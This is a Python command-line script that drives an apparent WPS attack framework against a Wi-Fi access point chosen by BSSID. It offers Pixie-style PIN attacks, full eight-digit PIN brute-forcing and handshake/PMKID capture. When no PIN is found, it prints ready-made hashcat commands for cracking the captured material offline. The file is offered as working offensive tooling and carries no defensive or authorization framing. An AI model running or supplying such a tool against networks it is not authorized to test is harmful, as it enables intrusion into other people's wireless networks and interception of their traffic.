#!/usr/bin/env python3
"""
WPS Attack Master Script - Full Integration with pixiewps-extend
Usage: python3 wps_attack.py <BSSID> [options]
"""

import sys
import argparse
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent / 'src'))

try:
    from advanced_attack import AdvancedWPSAttacker, WPSTarget
except ImportError:
    print("[-] Error: advanced_attack module not found")
    print("[i] Run from pixiewps-extend directory")
    sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description="Advanced WPS Attack Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic attack on specific target
  python3 wps_attack.py 98:03:8E:81:C1:F6
  
  # With custom interface and threading
  python3 wps_attack.py 98:03:8E:81:C1:F6 -i wlan0mon -t 8
  
  # Full brute-force (slow)
  python3 wps_attack.py 98:03:8E:81:C1:F6 --full-brute
  
  # Capture only (handshake/PMKID for offline)
  python3 wps_attack.py 98:03:8E:81:C1:F6 --capture-only
        """
    )
    
    parser.add_argument("bssid", help="Target BSSID (MAC address)")
    parser.add_argument("-i", "--interface", default="wlan0mon", 
                       help="Wireless interface (default: wlan0mon)")
    parser.add_argument("-e", "--essid", default="Target", 
                       help="Network ESSID")
    parser.add_argument("-c", "--channel", type=int, default=6,
                       help="Wireless channel (default: 6)")
    parser.add_argument("-s", "--signal", type=int, default=-50,
                       help="Signal strength in dBm (default: -50)")
    parser.add_argument("-t", "--threads", type=int, default=4,
                       help="Number of brute-force threads (default: 4)")
    parser.add_argument("--timeout", type=int, default=3600,
                       help="Overall timeout in seconds (default: 3600)")
    parser.add_argument("--full-brute", action="store_true",
                       help="Brute-force all PINs 0-99999999 (very slow)")
    parser.add_argument("--capture-only", action="store_true",
                       help="Only capture handshake/PMKID, skip PIN attacks")
    parser.add_argument("-q", "--quiet", action="store_true",
                       help="Quiet mode (errors only)")
    parser.add_argument("-v", "--verbose", action="store_true", default=True,
                       help="Verbose output (default)")
    
    args = parser.parse_args()
    
    # Validate BSSID format
    if len(args.bssid) != 17 or args.bssid.count(':') != 5:
        print("[-] Invalid BSSID format. Use: XX:XX:XX:XX:XX:XX")
        sys.exit(1)
    
    # Create target
    target = WPSTarget(
        bssid=args.bssid,
        essid=args.essid,
        channel=args.channel,
        signal=args.signal,
        manufacturer="Unknown",
        model="Unknown",
        is_wps_enabled=True
    )
    
    # Create attacker instance
    attacker = AdvancedWPSAttacker(args.interface, verbose=not args.quiet)
    
    # Run attack sequence
    try:
        result = attacker.attack_sequence(target)
        
        # Print results
        if result["success"]:
            print(f"\n[+] SUCCESS! PIN: {result['pin']}")
            print(f"[+] Method: {result['method']}")
        else:
            print(f"\n[!] PIN not found, but captured:")
            if result["handshake"]:
                print(f"    Handshake: {result['handshake']}")
                print(f"    Command: hashcat -m 22000 {result['handshake']} wordlist.txt")
            if result["pmkid"]:
                print(f"    PMKID: {result['pmkid']}")
                print(f"    Command: hashcat -m 16800 {result['pmkid']} wordlist.txt")
    
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
